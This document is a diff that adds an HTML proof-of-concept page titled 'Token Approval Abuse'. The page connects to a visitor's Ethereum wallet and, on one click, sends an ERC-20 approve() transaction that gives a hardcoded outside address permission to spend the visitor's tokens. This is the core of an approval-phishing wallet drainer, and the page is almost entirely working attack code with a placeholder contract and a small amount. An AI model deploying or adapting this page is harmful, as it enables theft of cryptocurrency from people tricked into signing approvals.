@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Token Approval Abuse</title>
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+</head>
+<body>
+    <h1>Token Approval PoC</h1>
+    <button id="approve">Approve Token</button>
+    <p id="status" style="color: red; font-weight: bold;"></p>
+
+    <script>
+        const web3 = new Web3(Web3.givenProvider);
+
+        document.getElementById('approve').onclick = async () => {
+            try {
+                document.getElementById('status').innerText = "Connecting to wallet...";
+                const accounts = await web3.eth.requestAccounts();
+                document.getElementById('status').innerText = "Wallet connected: " + accounts[0];
+
+                const tokenContract = new web3.eth.Contract(
+                    // ABI hanya dengan fungsi approve
+                    [
+                        {
+                            "constant": false,
+                            "inputs": [
+                                { "name": "_spender", "type": "address" },
+                                { "name": "_value", "type": "uint256" }
+                            ],
+                            "name": "approve",
+                            "outputs": [{ "name": "", "type": "bool" }],
+                            "type": "function"
+                        }
+                    ],
+                    "0xTokenAddress" // Ganti dengan alamat kontrak token
+                );
+
+                document.getElementById('status').innerText = "Sending approval transaction...";
+                await tokenContract.methods
+                    .approve("0x70c92148c5dd2051edc4f4663611a37984efcf81", "1000000000000000000") // 1 token
+                    .send({ from: accounts[0] });
+
+                alert("Approval successful! Token spender: 0xMaliciousDAppAddress");
+                document.getElementById('status').innerText = "Approval successful!";
+            } catch (err) {
+                alert("Error: " + err.message);
+                document.getElementById('status').innerText = "Approval failed: " + err.message;
+            }
+        };
+    </script>
+</body>
+</html>
